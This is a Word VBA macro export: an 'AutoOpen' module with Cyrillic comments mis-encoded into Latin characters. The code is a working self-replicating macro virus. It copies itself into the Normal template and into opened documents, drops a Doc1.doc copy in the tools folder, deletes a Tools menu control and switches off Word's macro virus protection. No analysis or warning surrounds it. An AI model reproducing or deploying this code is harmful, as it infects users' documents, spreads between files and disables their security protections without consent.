   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"
   Sub Main()
   Attribute Main.VB_Description = "Ìàêðîñ çàïèñàí 01.11.00 Äàâûäîâ Ä.Â."
   Attribute Main.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ1"
   '
   ' Ìàêðîñ1 Ìàêðîñ
   ' Ìàêðîñ çàïèñàí 01.11.00
   '

      ' t = InputBox("?")
      Pat$ = Options.DefaultFilePath(Path:=wdToolsPath) & "\Doc1.doc"
       If Dir(Pat$) = "Doc1.doc" Then a = 1 Else a = 0
       If ActiveDocument.VBProject.VBComponents.Count <= 1 Then b = 0 Else b = 10
       c = a + b

       Select Case c
       Case 10
           Application.ScreenUpdating = False
           ad$ = ActiveDocument.FullName
           Selection.WholeStory
           Selection.Delete Unit:=wdCharacter, Count:=1
           ActiveDocument.SaveAs FileName:= _
           Pat$, FileFormat:=wdFormatDocument, LockComments:=False, Password:="", _
           AddToRecentFiles:=False, WritePassword:="", ReadOnlyRecommended:=False, _
           EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData _
           :=False, SaveAsAOCELetter:=False


           Documents.Open ad$
           Application.OrganizerCopy Source:= _
           ad$, Destination:= _
           NormalTemplate.FullName, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
           Documents("Doc1.doc").Close SaveChanges:=wdSaveChanges
           Application.ScreenUpdating = True
       Case 1
           ad$ = ActiveDocument.FullName
           Application.OrganizerCopy Source:= _
           Pat$, Destination:= _
           ad$, Name:="AutoOpen", _
           Object:=wdOrganizerObjectProjectItems
           CommandBars("Tools").Controls(12).Delete
           Options.VirusProtection = False
           ActiveDocument.Save
       End Select

   End Sub

